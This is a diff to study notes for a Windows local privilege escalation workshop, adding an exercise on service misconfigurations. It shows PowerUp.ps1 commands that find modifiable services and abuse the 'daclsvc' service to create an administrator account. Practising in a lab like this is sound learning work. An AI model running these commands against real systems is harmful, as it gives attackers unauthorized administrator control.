@@ -6,6 +6,7 @@ source: https://github.com/sagishahar/lpeworkshop
 
 01 Video: https://www.youtube.com/watch?v=HTM-BavQvs4&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=2&t=0s
 
+----------------------------------------------------------------------------------------------------------------------------------------
 # Services
 
     01 - Services (binPath)
@@ -20,6 +21,24 @@ source: https://github.com/sagishahar/lpeworkshop
 
 
 01 - https://www.youtube.com/watch?v=7KjCTmSb1PM&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=3&t=0s
+
+Exercises:
+
+Using powershell with PowerUP.ps1
+
+> Import-Module .\PowerUp.ps1
+
+> Get-ModifiableService
+
+AbuseFunction
+
+> Invoke-ServiceAbuse -Name 'daclsvc'
+
+Next, checking you user John create with permissions Administrator.
+
+> net user
+
+----------------------------------------------------------------------------------------------------------------------------------------
 
 02 - https://www.youtube.com/watch?v=9s8jYwx9FSA&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=4&t=0s
 
